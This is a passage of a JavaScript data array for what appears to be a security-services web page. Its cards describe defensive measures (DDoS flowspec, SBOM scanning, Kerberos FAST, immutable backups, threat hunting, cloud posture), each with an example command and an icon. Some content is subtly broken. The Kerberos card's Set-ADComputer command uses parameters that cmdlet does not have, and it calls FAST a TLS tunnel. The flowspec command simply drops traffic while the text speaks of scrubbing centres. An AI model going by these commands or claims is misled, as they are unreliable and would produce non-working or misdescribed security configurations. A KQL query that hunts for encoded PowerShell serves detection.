    vector: 'neighbor 198.51.100.1 announce flowspec route { match destination 203.0.113.0/24; rate-limit 0; }',
    details: 'Distribute edge ingress traffic across globally distributed scrubbing centers, neutralizing multi-terabit DDoS floods upstream.',
    svg: (
      <svg className="w-7 h-7 text-[#2ab7ff]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
        <circle cx="12" cy="12" r="10" />
        <line x1="2" y1="12" x2="22" y2="12" />
        <path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z" />
      </svg>
    )
  },
  {
    id: 'sbom',
    num: '17',
    title: 'SBOM Vulnerability Scan',
    badge: 'Pipeline Guard',
    tags: '#trivy #syft #cve',
    category: 'Supply Chain Guard',
    desc: 'Generate Software Bill of Materials (SBOM) and block container deployments that introduce critical CVE vulnerabilities.',
    vector: 'trivy image --severity CRITICAL,HIGH --exit-code 1 production-api:latest',
    details: 'Automate static and binary analysis during container build processes to prevent vulnerable open-source dependencies from shipping to production.',
    svg: (
      <svg className="w-7 h-7 text-[#2ab7ff]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
        <path d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z" />
        <polyline points="3.27 6.96 12 12.01 20.73 6.96" />
        <line x1="12" y1="22.08" x2="12" y2="12" />
      </svg>
    )
  },
  {
    id: 'kerberos-armor',
    num: '18',
    title: 'Kerberos FAST Armoring',
    badge: 'Domain Hardening',
    tags: '#fast #kdc #activedir',
    category: 'Directory Armor',
    desc: 'Enforce Flexible Authentication Secure Tunneling (FAST) to wrap Kerberos authentication tickets in TLS tunnels, defeating offline cracking.',
    vector: 'Set-ADComputer -Identity DC01 -KerberosArmoringEnabled $true -KerberosFAST $true',
    details: 'Protect AS-REQ exchange tickets against offline password cracking by mandating armor keys derived from verified computer identities.',
    svg: (
      <svg className="w-7 h-7 text-[#2ab7ff]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
        <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10" />
      </svg>
    )
  },
  {
    id: 'airgap-backup',
    num: '19',
    title: 'Immutable Storage Airgap',
    badge: 'Ransomware Shield',
    tags: '#s3-lock #worm #airgap',
    category: 'Resilience',
    desc: 'Store disaster recovery snapshots in Write-Once-Read-Many (WORM) vaults with legal hold preventing unauthorized encryption.',
    vector: 'aws s3api put-object-legal-hold --bucket backup-immutable --key prod_db.bak --legal-hold Status=ON',
    details: 'Ensure disaster recovery storage repositories are cryptographically locked against deletion or modification by compromised domain admin credentials.',
    svg: (
      <svg className="w-7 h-7 text-[#2ab7ff]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
        <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4" />
        <polyline points="17 8 12 3 7 8" />
        <line x1="12" y1="3" x2="12" y2="15" />
      </svg>
    )
  },
  {
    id: 'threat-hunt',
    num: '20',
    title: 'Automated Threat Hunt',
    badge: 'Behavioral Intel',
    tags: '#yara #sigma #kql',
    category: 'Active Hunting',
    desc: 'Execute automated Sigma and YARA-L detection hunting queries across process injection telemetry to discover hidden APTs.',
    vector: 'DeviceProcessEvents | where ProcessCommandLine contains "powershell -enc" and InitiatingProcessFileName != "cmd.exe"',
    details: 'Continuously query endpoint event logs against evolving MITRE ATT&CK techniques to expose in-memory living-off-the-land executions.',
    svg: (
      <svg className="w-7 h-7 text-[#2ab7ff]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
        <circle cx="12" cy="12" r="10" />
        <line x1="22" y1="12" x2="18" y2="12" />
        <line x1="6" y1="12" x2="2" y2="12" />
        <line x1="12" y1="6" x2="12" y2="2" />
        <line x1="12" y1="22" x2="12" y2="18" />
      </svg>
    )
  },
  {
    id: 'cspm',
    num: '21',
    title: 'Cloud Posture (CSPM)',
    badge: 'Policy Enforcer',
    tags: '#opa #terraform #drift',
    category: 'Cloud Governance',
    desc: 'Continuously inspect cloud infrastructure for security drift, open S3 buckets, and overly permissive firewall groups.',
    vector: 'opa eval --data policies/aws_security.rego --input terraform.json "data.aws.security.deny"',
    details: 'Enforce real-time compliance policies across AWS, Azure, and GCP accounts to automatically remediate unencrypted data storage and public ingress.',
    svg: (
      <svg className="w-7 h-7 text-[#2ab7ff]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
        <path d="M17.5 19H9a7 7 0 1 1 6.71-9h1.79a4.5 4.5 0 1 1 0 9Z" />
        <path d="m9 13 2 2 4-4" />
      </svg>
    )
  }
];
